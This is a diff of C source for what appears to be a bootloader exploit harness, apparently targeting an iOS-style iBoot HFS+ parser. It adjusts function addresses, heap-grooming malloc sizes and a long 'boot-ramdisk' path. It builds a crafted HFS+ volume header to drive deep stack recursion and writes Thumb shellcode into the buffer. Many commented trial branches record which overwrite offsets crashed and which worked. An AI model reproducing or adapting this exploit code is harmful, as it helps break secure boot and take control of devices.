@@ -31,7 +31,7 @@
 #define putchar_ADDR            (0x31B78 + 1)
 #define adjust_stack_ADDR       (0x1D6E0 + 1)
 #define adjust_environ_ADDR     (0x1DB14 + 1)
-#define disable_interrupts_ADDR (0x32884 + 1)
+#define disable_interrupts_ADDR (0x328B4 + 1)
 #define cache_stuff_ADDR        (0x20300 + 1)
 #define wtf_ADDR                (0x????? + 1) /* ??? */
 
@@ -109,7 +109,7 @@ real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
     if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
         dumpfile("DUMP_z3");        
-#if 1
+#if 0
         eprintf("Printing memory...\n");
         eprintf("*** MEMORY ***\n");
         unsigned int i = 0x44730;
@@ -219,14 +219,14 @@ my_adjust_stack(void)
     Entering recovery mode, starting command prompt
      
      */
-#if 1
-    CALL(malloc)(1984 - 64);
-#elif 0
+#if 0
+    CALL(malloc)(2048 - 128);
+#elif 1
     void *ptr;
-    ptr = CALL(malloc)(1984 - 64);
+    ptr = CALL(malloc)(2048 - 128);
     CALL(free)(ptr);
-    CALL(malloc)(988 - 64);
-    CALL(malloc)(988 - 64);
+    CALL(malloc)(1024 - 64);
+    CALL(malloc)(1024 - 128);
 #endif
 }
 
@@ -235,7 +235,7 @@ void
 my_adjust_environ(void)
 {
 #if 1
-    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/disk.dmg", 0);
+    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/disk.dmg", 0);
 #endif
 }
 
@@ -286,7 +286,6 @@ suck_sid(void)
     *(uint32_t*)XLAT(0x5ff41370) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41374) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41378) = 0x00000000;
-    //*(uint32_t*)XLAT(0x5ff41388) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff4138c) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff41390) = 0x00000000;
     *(uint32_t*)XLAT(0x5ff414bc) = 0x00000000;
@@ -317,21 +316,19 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);  
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#define NODE_SIZE (0x1000) /* 0x1000似乎更好 */
+#define NODE_SIZE (0x1000) /* also 0x1000 is working */
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
 if (1) {
     /* XXX stack recursion eats 208 bytes, watch out for 0x52ac0 + 0x18 = 0x52ad8 */
-    /* that address contains the irq_disable_count of the boootstrap task */
-    /* probably to watch out as it is between the garbage writing */
     static int seq = 0;
     switch (seq) {
         case 0:
                 /* here buffer is struct HFSPlusVolumeHeader */
             PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);    /* HFSPlusVolumeHeader::catalogFile.logicalSize */
             PUT_QWORD_BE(buffer,  0xC0, EXTENT_SIZE);        /* HFSPlusVolumeHeader::extentsFile.logicalSize */
-            //SHELLCODE2
+            /*SHELLCODE2*/
 #if 1    
             PUT_WORD_LE(buffer, 0x443E0 + 0 - 0x44270, INSNT_LDR_R_PC(0, 32));
             PUT_DWORD_LE(buffer, 0x443E0 + 2 - 0x44270, INSNW_MOV_R1_40000000);
@@ -340,8 +337,9 @@ if (1) {
             PUT_WORD_LE(buffer, 0x443E0 + 10 - 0x44270, INSNT_LDR_R_PC(1, 32));
             PUT_WORD_LE(buffer, 0x443E0 + 12 - 0x44270, INSNT_STR_R1_R4_R0);
             PUT_WORD_LE(buffer, 0x443E0 + 14 - 0x44270, INSNT_LDR_R_PC(0, 32));
-            PUT_WORD_LE(buffer, 0x443E0 + 16 - 0x44270, INSNT_MOV_R_I(1, 0xFC));
+            PUT_WORD_LE(buffer, 0x443E0 + 16 - 0x44270, INSNT_MOV_R_I(1, 0x100));
             PUT_WORD_LE(buffer, 0x443E0 + 18 - 0x44270, INSNT_LDR_R_PC(2, 32));
+fprintf(stderr, "sz:%x\n", nettoyeur_sz);
             PUT_WORD_LE(buffer, 0x443E0 + 20 - 0x44270, INSNT_MOV_R_I(3, nettoyeur_sz));
             PUT_WORD_LE(buffer, 0x443E0 + 22 - 0x44270, INSNT_MOV_R_R(5,0));
             PUT_DWORD_LE(buffer, 0x443E0 + 24 - 0x44270, make_bl(0, 0x443E0 + 24, decompress_lzss_ADDR - 1));
@@ -406,7 +404,7 @@ if (1) {
             PUT_WORD_LE(buffer,  0x44730 +  34 - 0x44694, INSNT_BLX_R(0));
             PUT_DWORD_LE(buffer, 0x44730 +  36 - 0x44694, make_bl(0, 0x44730 + 38, cache_stuff_ADDR - 1));
             PUT_WORD_LE(buffer,  0x44730 +  40 - 0x44694, INSNT_BLX_R(5));
-	        PUT_WORD_LE(buffer,  0x44730 +  42 - 0x44694, INSNT_BX_R(4));
+	    PUT_WORD_LE(buffer,  0x44730 +  42 - 0x44694, INSNT_BX_R(4));
             PUT_DWORD_LE(buffer, 0x44730 +  76 - 0x44694, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
             PUT_DWORD_LE(buffer, 0x44730 +  80 - 0x44694, (uintptr_t)image /* 0x44000000 */);
             PUT_DWORD_LE(buffer, 0x44730 +  84 - 0x44694, (uintptr_t)image /* 0x5ff00000 */);
@@ -437,119 +435,139 @@ if (1) {
                         [pad]
                      }
                      */
-#if 0
+#if 0 /*r2不对*/
                 if (seq == 1 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 32, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*sp:447cc, r2:44870*/
                 if (seq == 2 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 44, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*sp:44808, r2:447fc*/
                 if (seq == 3 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 44, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 4 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 56, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*?*/
                 if (seq == 5 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 56, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 6 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 68, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 7 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 68, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 8 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 80, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*?*/
                 if (seq == 9 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 80, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*sp:44820, r2:44814*/
                 if (seq == 10 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 92, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 11 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 92, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*?*/
                 if (seq == 12 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 104, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*r2不对*/ 
                 if (seq == 13 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 104, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 14 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 116, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 15 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 116, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*?*/
                 if (seq == 16 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 128, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*sp:447d0 r2:447d4*/
                 if (seq == 17 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 128, 0x10000);
                     break;
                 }
-#elif 0 
+#elif 0 /*wfe*/ 
                 if (seq == 18 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 140, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 19 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 140, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 20 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 152, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*wfe*/
                 if (seq == 21 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 152, 0x10000);
                     break;
                 }
-#elif 1
+#elif 0 /*sp:447f0 r2:447e4 for (boot-path), since it's not working very well, abandoned*/
                 if (seq == 22 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 164, 0x10000);
                     break;
                 }
-#elif 0
+#elif 0 /*?*/
                 if (seq == 23 * 3 + 1) {
+                    PUT_DWORD_BE(buffer, 164, 0x10000);
+                    break;
+                }
+#elif 0 /*wfe*/
+                if (seq == 24 * 3 + 1) {
                     PUT_DWORD_BE(buffer, 176, 0x10000);
+                    break;
+                }
+#elif 0 /*?*/
+                if (seq == 25 * 3 + 1) {
+                    PUT_DWORD_BE(buffer, 176, 0x10000);
+                    break;
+                }
+#elif 1 /*^_^*/
+                if (seq == 26 * 3 + 1) {
+                    PUT_DWORD_BE(buffer, 188, 0x10000);
+                    break;
+                }
+#elif 0
+                if (seq == 27 * 3 + 1) {
+                    PUT_DWORD_BE(buffer, 200, 0x10000);
                     break;
                 }
 #endif
@@ -821,9 +839,8 @@ patch_image(unsigned char *image)
 
 void
 patch_nettoyeur(unsigned char *nettoyeur)
-{
-    *(void **)(nettoyeur + 0xF0) = image + *(uint32_t *)(nettoyeur + 0xF0) - (IMAGE_LOADADDR + 0x4000000);
-    *(void **)(nettoyeur + 0xF4) = XLAT(*(uint32_t *)(nettoyeur + 0xF4));
+{  
+    *(void **)(nettoyeur + 0xF4) = image + *(uint32_t *)(nettoyeur + 0xF4) - (IMAGE_LOADADDR + 0x4000000);
     *(void **)(nettoyeur + 0xF8) = XLAT(*(uint32_t *)(nettoyeur + 0xF8));
 }
 
